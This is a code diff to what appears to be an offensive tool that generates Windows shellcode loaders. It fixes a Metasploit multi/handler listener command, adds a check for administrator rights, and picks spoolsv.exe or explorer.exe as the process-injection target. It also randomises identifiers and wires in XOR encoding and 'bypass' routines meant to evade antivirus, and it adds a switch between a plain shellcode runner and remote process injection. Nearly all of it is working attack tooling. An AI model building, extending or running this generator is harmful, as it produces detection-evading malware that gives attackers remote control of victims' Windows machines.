@@ -542,7 +542,7 @@ class Windows(ShellCoder):
         with open("%s/generate.sh" % self.output_path, 'w') as f:
             f.write(generate_script)
 
-        listener_command = "msfconsole -q -x 'use multi/handler; set payload %s, set LHOST %s; set LPORT %s; set EXITFUNC %s;exploit'" % (
+        listener_command = "msfconsole -q -x 'use multi/handler; set payload %s; set LHOST %s; set LPORT %s; set EXITFUNC %s;exploit'" % (
             self.payload, self.selected_ip, self.selected_port, self.exit_func)
 
         generate_script = """#!/bin/bash
@@ -631,17 +631,39 @@ if ({bypass_calls}) {{
         return """#include <windows.h>
 #include <tlhelp32.h>
 #include <string>
+#include <sddl.h>
 {bypass_imports}
 using namespace std;
 
 {bypass_functions}
+
+BOOL {is_elevated}() {{
+    PSID {admin_group};
+    BOOL {is_admin};
+    SID_IDENTIFIER_AUTHORITY {NtAuthority} = SECURITY_NT_AUTHORITY;
+    if (!AllocateAndInitializeSid(&{NtAuthority}, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &{admin_group})) {{
+        return FALSE;
+    }}
+    if (!CheckTokenMembership(NULL, {admin_group}, &{is_admin})) {{
+        {is_admin} = FALSE;
+    }}
+    FreeSid({admin_group});
+    return {is_admin};
+}}
 
 DWORD {find_process_id}()
 {{
     HANDLE {h_process_snap};
     PROCESSENTRY32 {pe32};
     DWORD {result} = 0;
-    const char *{process_name} = "{process}";
+    
+    char *{process_name};
+    
+    if ({is_elevated}()) {{
+        {process_name} = "spoolsv.exe";
+    }} else {{
+        {process_name} = "explorer.exe";
+    }}
 
     {h_process_snap} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     
@@ -704,8 +726,7 @@ int main(int argc, char **argv) {{
             h_process_snap=self.make_random_str(),
             pe32=self.make_random_str(),
             result=self.make_random_str(),
-            process="explorer.exe",  # TODO
-            process_name="explorer", # TODO
+            process_name=self.make_random_str(),
             bypass_calls=bypass_calls,
             xor_var=xor_var,
             xor_key=xor_key,
@@ -717,6 +738,10 @@ int main(int argc, char **argv) {{
             process_handle=self.make_random_str(),
             remote_thread=self.make_random_str(),
             remote_buffer=self.make_random_str(),
+            is_elevated=self.make_random_str(),
+            NtAuthority=self.make_random_str(),
+            is_admin=self.make_random_str(),
+            admin_group=self.make_random_str(),
         )
 
     @staticmethod
@@ -808,7 +833,13 @@ int main(int argc, char **argv) {{
 
     def gen_template(self):
         bypass_functions, bypass_calls, bypass_imports = self.gen_bypass()
-        template = self.shellcode_runner_template(bypass_functions, bypass_calls, bypass_imports)
+
+        if self.injection_technique == "1":
+            template = self.shellcode_runner_template(bypass_functions, bypass_calls, bypass_imports)
+        elif self.injection_technique == "2":
+            template = self.process_injection_template(bypass_functions, bypass_calls, bypass_imports)
+        else:
+            raise NotImplemented("Unknown technique")
         self.template_path = "%s/template.c" % self.output_path
         self.write_template(template)
 
@@ -830,6 +861,7 @@ int main(int argc, char **argv) {{
                    '-fmerge-all-constants ' \
                    '-static-libstdc++ ' \
                    '-static-libgcc ' \
+                   '-lntdll ' \
                    '-Wl,--gc-sections'
 
         for flag in self.additional_flags:
